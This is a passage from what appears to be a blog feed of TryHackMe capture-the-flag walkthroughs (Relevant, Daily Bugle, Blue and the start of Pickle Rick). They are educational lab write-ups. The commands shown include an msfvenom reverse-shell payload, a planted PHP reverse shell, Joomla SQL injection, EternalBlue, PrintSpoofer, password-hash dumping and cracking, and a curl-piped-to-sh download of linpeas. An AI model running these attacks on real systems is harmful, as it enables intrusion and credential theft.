<p><strong>Writeups will not be accepted for this room.</strong></p>

<p><br /></p>

<h3 id="11-user-flag">1.1 User Flag?</h3>

<p>Let’s do a nmap scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -P- 10.10.7.6
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/nmap.png" alt="nmap" /></p>

<p>And we found a few ports that will work for us. These are 80/tcp HTTP, 49663/tcp HTTP, and 445/tcp</p>

<p>I did a gobuster scan, and the connection to both HTTP ports, probably due to my VPN, was very slow, I couldn’t wait, so I couldn’t get any results from the gobuster scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.7.6:49663/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/gobuster.png" alt="gobuster" /></p>

<p>So I decided to try SMB login.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient -L //10.10.7.6
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/smb.png" alt="smb" /></p>

<p>There is no password.</p>

<p>We found this <code class="language-plaintext highlighter-rouge">nt4wrksv</code>. Now, let’s try to get in here.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient //10.10.7.6/nt4wrksv
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/password.png" alt="password" /></p>

<p>We found the passwords.txt file. Let’s see what’s in it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; get passwords.txt
&gt; exit
$ cat passwords.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/smbin.png" alt="smbin" /></p>

<p>This file contains base64 encoded credentials:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "Qm9iIVBAJCRXMHJEITRyMw==" | base64 -d
$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA20TY5NjkhJCQK" | base4 -d
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/base64.png" alt="base64" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Bob : !P@$$W0rD!123</code></strong></p>

<p><strong><code class="language-plaintext highlighter-rouge">Bill: Juw4nnaM4n420696969!$$$</code></strong></p>

<p>You have access to SMB, so let’s check if we can install and run the reverse shell.</p>

<p>First, let’s create a reverse shell. Then let’s put it in SMB.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.168.86 lport=4444 -f aspx -o shell.aspx
$ smbclient //10.10.7.6/nt4wrksv
$ put shell.aspx 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/payload.png" alt="payload" /></p>

<p>Now let’s create a listener using metasploit.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
&gt; use exploit/multi/handler
&gt; set payload windows/x64/meterpreter_reverse_tcp
&gt; set LHOST 10.8.168.86
&gt; set LPORT 4444
&gt; run
</code></pre></div></div>
<p>And call the reverse shell in the browser <strong><code class="language-plaintext highlighter-rouge">http://10.10.7.6:49663/nt4wrksv/shell.aspx</code></strong></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/relevant/info.png" alt="info" /></p>

<p>Now we can get the user flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cd c:/Users/Bob/Desktop
&gt; cat user.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="12-root-flag">1.2 Root Flag?</h3>

<p>We need to do an authorization elevation for the root flag. 
Running the “whoami /priv” command to check the current user’s privileges in the system:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; shell
&gt; whoami /priv
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/priv.png" alt="priv" /></p>

<p>It appears the current user has the SeImpersonatePrivilege token enabled, which means token impersonation could be used to escalate privileges.</p>

<p>Although Juicy Potato is normally used to exploit token impersonation, this only works if DCOM is enabled on the server. A great alternative is the PrintSpoofer exploit. Downloading the exploit from the Git repository and placing it on the nt4wrksv SMB share so it can be easily transferred to the target machine: <a href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0">PrintSpoofer</a></p>

<p>First, let’s download the file and put it in SMB, then run it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
$ smbclient //10.10.7.6/nt4wrksv
$ put PrintSpoofer64.exe
</code></pre></div></div>

<p>Let’s go back to shell and follow.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cd \inetpub\wwwroot\nt4wrksv
&gt; dir
&gt; PrintSpoofer64.exe -i -c powershell.exe
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/relevant/privesc.png" alt="privesc" /></p>

<p>And now we have root privileges. Now we can reach the root flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd c:/Users/Administrator/Desktop
$ cat root.txt
</code></pre></div></div>
<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="pentest," /><category term="security," /><category term="accessible" /><summary type="html"><![CDATA[Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/relevant.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/relevant.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Daily Bugle</title><link href="http://localhost:4000/tryhackme-daily-bugle/" rel="alternate" type="text/html" title="TryHackMe - Daily Bugle" /><published>2023-03-17T00:00:00+03:00</published><updated>2023-03-17T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-daily-bugle</id><content type="html" xml:base="http://localhost:4000/tryhackme-daily-bugle/"><![CDATA[<p>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.</p>

<p><br /></p>

<h2 id="1-deploy">1. Deploy</h2>

<p>Deploy the machine - it may take up to 2 minutes to configure.</p>

<p><br /></p>

<h3 id="11-access-the-web-server-who-robbed-the-bank">1.1 Access the web server, who robbed the bank?</h3>

<p>As usual, let’s do a nmap scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.139.115
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/daily-bugle/nmap.png" alt="nmap" /></p>

<p>We found three open port. Theese are 22/tcp SSH, 80/tcp HTTP and 3306/tcp MYSQL.</p>

<p>Let’s visit the homepage. Let’s see what we can find.</p>

<p>We found the robber. It’s a spiderman.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/home.png" alt="home" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">spiderman</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="2-obtain-user-and-root">2. Obtain User and Root</h2>

<p>Hack into the machine and obtain the root user’s credentials.</p>

<p><br /></p>

<h3 id="21-what-is-the-joomla-version">2.1 What is the Joomla version?</h3>

<p>Now, let’s do a gobuster scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.139.115/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/daily-bugle/gobuster.png" alt="gobuster" /></p>

<p>Let’s do a scan using joomscan to find the Joomla version.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ joomscan --url http://10.10.139.115/
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/daily-bugle/joomscan.png" alt="joomscan" /></p>

<p>We found the Joomla version. It is 3.7.0.</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3.7.0</code></strong></p>

<p><br /></p>

<p><em>Instead of using SQLMap, why not use a python script!</em></p>

<h3 id="22-what-is-jonahs-cracked-password">2.2 What is Jonah’s cracked password?</h3>

<p>With the Joomla version we found, we now search in exploit-db and see if we can find anything.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/search.png" alt="search" /></p>

<p>Yes, we found the vulnerability. <a href="https://www.exploit-db.com/exploits/42033">CVE-2017-8917</a>.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/db.png" alt="db" /></p>

<p>You can progress using <strong><code class="language-plaintext highlighter-rouge">sqlmap</code></strong> here, but I will use a python script written for faster results. Still below is the code for sqlmap</p>

<p><img src="/assets/img/tryhackme/daily-bugle/sql.png" alt="sql" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u "http://10.10.139.115/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/daily-bugle/sqlmap.png" alt="sqlmap" /></p>

<p>I will use the python script <a href="https://github.com/stefanlucas/Exploit-Joomla">here</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
$ python joomblah http://10.10.139.115/
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/daily-bugle/joomblah.png" alt="joomblah" /></p>

<p>We found this hash code for Jonah’s password.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
</code></pre></div></div>

<p>Let’s crack this hash.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/daily-bugle/john.png" alt="john" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">spiderman123</code></strong></p>

<p><br /></p>

<h3 id="23-what-is-the-user-flag">2.3 What is the user flag?</h3>

<p>Go to the administrator directory and login with <strong><code class="language-plaintext highlighter-rouge">jonah:spiderman123</code></strong></p>

<p>We are looking for a suitable place for any reverse shell. We go to where the .php pages are located.</p>

<p>First, we click on <strong><code class="language-plaintext highlighter-rouge">Templates</code></strong> from the left sidebar.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/step1.png" alt="step1" /></p>

<p>Then we click on <strong><code class="language-plaintext highlighter-rouge">Templates</code></strong>  again on the page we go to.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/step2.png" alt="step2" /></p>

<p>Then we click on <strong><code class="language-plaintext highlighter-rouge">Beez3 Details and Files</code></strong>.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/step3.png" alt="step3" /></p>

<p>And we have reached the source files, and from here we can put our reverse shell in the index.php file.
You can find the reverse shell <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">here</a>.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/step4.png" alt="step4" /></p>

<p>Don’t forget to change this.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/change.png" alt="change" /></p>

<p>Now, we modify the contents of index.php.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/index.png" alt="index" /></p>

<p>We set up a netcat listener before opening the index.php page.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>Now browse <a href="http://10.10.139.115/templates/beez3/index.php">http://10.10.139.115/templates/beez3/index.php</a> and you should get a reverse shell.</p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/in.png" alt="in" /></p>

<p>The first thing on the server was to list the /home directory and find users.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/ls.png" alt="ls" /></p>

<p>I tried to enter the jjameson directory but it didn’t work. So I decided to download <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230312">linpeas.sh</a> and run it on the target machine.</p>

<p>First I set up my own machine. I am running the following code in the directory where the linpeas.sh file is located.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo python -m http.server 80
</code></pre></div></div>

<p>Then I run the following code on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl 10.8.86.168/linpeas.sh | sh 
</code></pre></div></div>

<p>And it worked, let’s see what we find.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/run.png" alt="run" /></p>

<p>We found a password but I have no idea what password it is.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/pass.png" alt="pass" /></p>

<p>Let’s try it for jjameson.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/jj.png" alt="jj" /></p>

<p>We also found the jjameson password<strong><code class="language-plaintext highlighter-rouge">(nv5uz9r3ZEDzVjNu)</code></strong></p>

<p>Now we can go to the jjameson directory and get the user flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /home/jjameson
$ ls -la
$ cat user.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/daily-bugle/user.png" alt="user" /></p>

<p><br /></p>

<h3 id="24-what-is-the-root-flag">2.4 What is the root flag?</h3>

<p>Now, I check by doing <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/yum.png" alt="yum" /></p>

<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/yum/">gftobins</a> to get root privileges using yum.</p>

<p>And let’s try this.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/gtfobins.png" alt="gtfobins" /></p>

<p>Yes, it worked.</p>

<p><img src="/assets/img/tryhackme/daily-bugle/privesc.png" alt="privesc" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /root
$ ls -la
$ cat root.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/daily-bugle/root.png" alt="root" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="sqli," /><category term="yum," /><category term="joomla" /><summary type="html"><![CDATA[Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/daily-bugle.png" /><media:content medium="image" url="http://localhost:4000/assets/img/daily-bugle.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Blue</title><link href="http://localhost:4000/tryhackme-blue/" rel="alternate" type="text/html" title="TryHackMe - Blue" /><published>2023-03-16T00:00:00+03:00</published><updated>2023-03-16T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-blue</id><content type="html" xml:base="http://localhost:4000/tryhackme-blue/"><![CDATA[<p><br /></p>

<h2 id="1-recon">1. Recon</h2>

<p>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</p>

<p><br /></p>

<h3 id="11-how-many-ports-are-open-with-a-port-number-under-1000">1.1 How many ports are open with a port number under 1000?</h3>

<p>Let’s find out how many ports are open on the target with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.173.132
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/nmap.png" alt="nmap" /></p>

<p>As you can see, there are 3 ports under 1000. These are 135/tcp, 139/tcp, and 445/tcp.</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3</code></strong></p>

<p><br /></p>

<h3 id="12-what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms--ex-ms08-067">1.2 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</h3>

<p>For more detailed information, let’s do a more detailed nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.173.132
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/nmap2.png" alt="nmap2" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
</code></pre></div></div>

<p>Now, we’re searching in the browser, to see if we can find anything.</p>

<p><img src="/assets/img/tryhackme/blue/search.png" alt="search" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">MS17-010</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="2-gain-access">2. Gain Access</h2>

<p>Exploit the machine and gain a foothold.</p>

<p><br /></p>

<h3 id="21-find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code-ex-exploit">2.1 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)</h3>

<p><img src="/assets/img/tryhackme/blue/rapid.png" alt="rapid" /></p>

<p>Now, let’s apply them to ourselves.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
msf6 &gt; show targets
msf6 &gt; set target 1
msf6 &gt; set payload windows/x64/shell/reverse_tcp
msf6 &gt; show options
msf6 &gt; set RHOSTS 10.10.173.132
msf6 &gt; set LHOST 10.8.86.168
msf6 &gt; exploit
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/set.png" alt="set" /></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/blue/in.png" alt="in" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code></strong></p>

<p><br /></p>

<h3 id="22-show-options-and-set-the-one-required-value-what-is-the-name-of-this-value-all-caps-for-submission">2.2 Show options and set the one required value. What is the name of this value? (All caps for submission)</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">RHOSTS</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="3-escalate">3. Escalate</h2>

<p>Escalate privileges, learn how to upgrade shells in metasploit.</p>

<p><br /></p>

<h3 id="31-if-you-havent-already-background-the-previously-gained-shell-ctrl--z-research-online-how-to-convert-a-shell-to-meterpreter-shell-in-metasploit-what-is-the-name-of-the-post-module-we-will-use-exact-path-similar-to-the-exploit-we-previously-selected">3.1 If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</h3>

<p><em>Hint: shell_to_meterpreter</em></p>

<p>We put the session opened with CTRL+Z in the background.</p>

<p><img src="/assets/img/tryhackme/blue/ses.png" alt="ses" /></p>

<p>We make a search using the hint.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; search shell_to_meterpreter
&gt; use 0
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/post.png" alt="post" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">post/multi/manage/shell_to_meterpreter</code></strong></p>

<p><br /></p>

<h3 id="32-select-this-use-module_path-show-options-what-option-are-we-required-to-change">3.2 Select this (use MODULE_PATH). Show options, what option are we required to change?</h3>

<p>Now we have to configure which Session shell to upgrade meterpreter. We can see the Session by running the following command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/l.png" alt="l" /></p>

<p>Set the session-id according to your session. We can use the following command to configure the session.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; show options
&gt; set SESSION 1
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/blue/id.png" alt="id" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">SESSION</code></strong></p>

<p><br /></p>

<h3 id="33-exploit">3.3 Exploit</h3>

<p>After making the adjustments, we run it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; run
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/run.png" alt="run" /></p>

<p>After the new session opened select the session and execute that session.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -l
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/ses2.png" alt="ses2" /></p>

<p>Now execute the new session by running the following command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -i 2
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/i2.png" alt="i2" /></p>

<p>And we are inside.</p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="4-cracking">4. Cracking</h2>

<p>Dump the non-default user’s password and crack it!</p>

<p><br /></p>

<h3 id="41-within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user">4.1 Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; hashdump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/hashdump.png" alt="hashdump" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">jon</code></strong></p>

<p><br /></p>

<h3 id="42-copy-this-password-hash-to-a-file-and-research-how-to-crack-it-what-is-the-cracked-password">4.2 Copy this password hash to a file and research how to crack it. What is the cracked password?</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashdump.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/john.png" alt="john" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">alqfna22</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="5-find-flags">5. Find flags!</h2>

<p>Find the three flags planted on this machine. These are not traditional flags, rather, they’re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</p>

<p><br /></p>

<h3 id="51-flag1-this-flag-can-be-found-at-the-system-root">5.1 Flag1? This flag can be found at the system root.</h3>

<p>Let’s move to the root directory to see how the file system looks like.</p>

<p><img src="/assets/img/tryhackme/blue/flag1.png" alt="flag1" /></p>

<p>Our first flag is located at the root of C:\</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{access_the_machine}</code></strong></p>

<p><br /></p>

<h3 id="52-flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows">5.2 Flag2? This flag can be found at the location where passwords are stored within Windows.</h3>

<p>Let’s find out where the other flags are.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; shell
&gt; dir *flag* /s /b 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/shell.png" alt="shell" /></p>

<p>Content of other flags.</p>

<p><img src="/assets/img/tryhackme/blue/flags.png" alt="flags" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{sam_database_elevated_access}</code></strong></p>

<p><br /></p>

<h3 id="53-flag3-this-flag-can-be-found-in-an-excellent-location-to-loot-after-all-administrators-usually-have-pretty-interesting-things-saved">5.3 flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{admin_documents_can_be_valuable}</code></strong>
<br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="windows," /><category term="eternal blue," /><category term="MS17-010" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blue.gif" /><media:content medium="image" url="http://localhost:4000/assets/img/blue.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Pickle Rick</title><link href="http://localhost:4000/tryhackme-pickle-rick/" rel="alternate" type="text/html" title="TryHackMe - Pickle Rick" /><published>2023-03-15T00:00:00+03:00</published><updated>2023-03-15T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-pickle-rick</id><content type="html" xml:base="http://localhost:4000/tryhackme-pickle-rick/"><![CDATA[<p>This is an easy CTF. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. 
Deploy the virtual machine on this task and explore the web application: “http://target-ip/”</p>

<p><br /></p>

<h3 id="1-what-is-the-first-ingredient-rick-needs">1. What is the first ingredient Rick needs?</h3>

<p>First, we run a <strong><code class="language-plaintext highlighter-rouge">nmap</code></strong> scan as usual.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.125.149
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/pickle_rick/nmap.png" alt="nmap" /></p>

<p>As you can see there are 2 ports running.</p>

<p>Let’s visit the website and see what we can find.
On the homepage, we see such an article.</p>

<p><img src="/assets/img/tryhackme/pickle_rick/home.png" alt="home" /></p>

<p>In summary, Rick needs 3 ingredients to get back to his old self. The names of these ingredients are located inside the target machine. First of all, we need to find rick’s password and username and login into the target.</p>

<p>Now let’s do a <strong><code class="language-plaintext highlighter-rouge">gobuster</code></strong> scan and see if we can find anything.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.125.149/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/pickle_rick/gobuster.png" alt="gobuster" /></p>

<p>Nothing came out.</p>

<p>Let’s do a <strong><code class="language-plaintext highlighter-rouge">nikto</code></strong> scan and see if we can find anything there.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nikto -h http://10.10.125.149/
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/pickle_rick/nikto.png" alt="nikto" /></p>

<p>Yes, we found something important here. <strong><code class="language-plaintext highlighter-rouge">login.php</code></strong> is most likely the place where we should log in.</p>

<p>We return to the homepage. We will take a look at the source codes of the pages.</p>

<p><img src="/assets/img/tryhackme/pickle_rick/source.png" alt="source" /></p>

<p>Yes, we found Rick’s username. 
<strong><code class="language-plaintext highlighter-rouge">R1ckRul3s</code></strong></p>

<p>I checked the source code of the login page, but nothing came up.</p>

<p>We check what is there in robots.txt, which is one of the classic control points. And we find an article I’m not sure about, but this article may be the password.</p>

<p><img src="/assets/img/tryhackme/pickle_rick/robot.png" alt="robot" /></p>

<p>I go back to the login page and try username and password.</p>

<p><strong>Username: <code class="language-plaintext highlighter-rouge">R1ckRul3s</code></strong></p>

<p><strong>Password: <code class="language-plaintext highlighter-rouge">Wubbalubbadubdub</code></strong></p>

<p><img src="/assets/img/tryhackme/pickle_rick/login.png" alt="login" /></p>

<p>And we are inside.
A command panel appears directly in front of us.</p>

<p><img src="/assets/img/tryhackme/pickle_rick/whoami.png" alt="whoami" /></p>

<p>Let’s take a look at the /home directory, who are our users?</p>

<p><img src="/assets/img/tryhackme/pickle_rick/whois.png" alt="whois" /></p>

<p>I’m looking to see what’s in the directory we’re in. <strong><code class="language-plaintext highlighter-rouge">ls -la</code></strong></p>

<p><img src="/assets/img/tryhackme/pickle_rick/ls.png" alt="ls" /></p>

<p>And it looks like there are important files here.</p>

<p>First, let’s take a look at what’s inside the clue.txt. <strong><code class="language-plaintext highlighter-rouge">cat clue.txt</code></strong></p>

<p><img src="/assets/img/tryhackme/pickle_rick/cat.png" alt="cat" /></p>

<p>The cat command is blocked. We can use less instead. Let’s do it. <strong><code class="language-plaintext highlighter-rouge">less clue.txt</code></strong></p>

<p><img src="/assets/img/tryhackme/pickle_rick/less.png" alt="less" /></p>

<p><em>clue.txt: Look around the file system for the other ingredient.</em></p>

<p>Yes the less command worked.</p>

<p>Now we can look at our first ingredient. <strong><code class="language-plaintext highlighter-rouge">less Sup3rS3cretPickl3Ingred.txt</code></strong></p>

<p><img src="/assets/img/tryhackme/pickle_rick/first.png" alt="first" /></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">mr. meeseek hair</code></strong></p>

<p><br /></p>

<h3 id="2-whats-the-second-ingredient-rick-needs">2. Whats the second ingredient Rick needs?</h3>

<p>You remember the rick directory in /home from the previous question. Most likely the second ingredient is here and the third is in the root directory.
I tried going to the/rick directory but it didn’t work so I can’t change the directory from the command panel. To solve this, we can run a reverse shell on the system and enter the target machine directly.</p>

<p>First I set up a netcat listener on my own machine.</p>

